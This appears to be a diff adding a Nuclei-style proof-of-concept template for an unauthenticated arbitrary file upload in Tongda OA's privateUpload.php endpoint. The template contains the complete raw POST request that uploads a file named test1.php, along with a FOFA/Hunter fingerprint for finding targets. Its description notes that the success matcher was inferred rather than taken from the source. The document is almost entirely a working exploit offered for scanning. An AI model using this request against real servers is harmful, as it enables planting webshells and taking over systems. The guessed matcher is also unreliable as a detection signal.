@@ -1,0 +1,45 @@
+id: poc-65ed3de14b398d374a70
+info:
+  name: 通达OAprivateUpload存在前台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/65ed3de14b398d374a70e51934f798dc
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 65ed3de14b398d374a70e51934f798dc
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /general/vmeet/privateUpload.php?fileName=test1.php+ HTTP/1.1
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 149
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.png"
+
+    Content-Type: image/png
+
+
+    123
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
